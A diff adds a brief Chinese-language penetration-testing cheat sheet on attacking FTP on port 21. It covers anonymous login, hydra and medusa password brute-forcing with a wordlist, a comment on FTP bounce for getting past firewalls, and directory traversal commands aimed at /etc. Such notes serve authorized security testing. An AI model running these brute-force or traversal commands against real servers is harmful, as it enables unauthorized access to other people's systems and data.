@@ -1,0 +1,40 @@
+# FTP (21) 攻击利用
+
+## 匿名登录
+```bash
+ftp 目标IP
+用户名: anonymous
+密码: anonymous@example.com
+
+# 或直接
+wget ftp://anonymous:anonymous@target/
+```
+
+## 爆破
+```bash
+hydra -l admin -P wordlist.txt ftp://target
+medusa -u admin -P wordlist.txt -M ftp -h target
+```
+
+## FTP 反弹
+```bash
+# 利用 FTP 主动模式绕过防火墙
+# ftp 连接攻击者的 FTP 服务获取文件
+```
+
+## 常见漏洞
+```bash
+# 目录遍历
+CWD ~root
+CWD ../../../../etc
+```
+
+## 常用命令
+```
+PORT    — 主动模式指定IP和端口
+PASV    — 被动模式
+PUT     — 上传文件
+GET     — 下载文件
+STOR    — 上传覆盖
+MKD     — 创建目录
+```
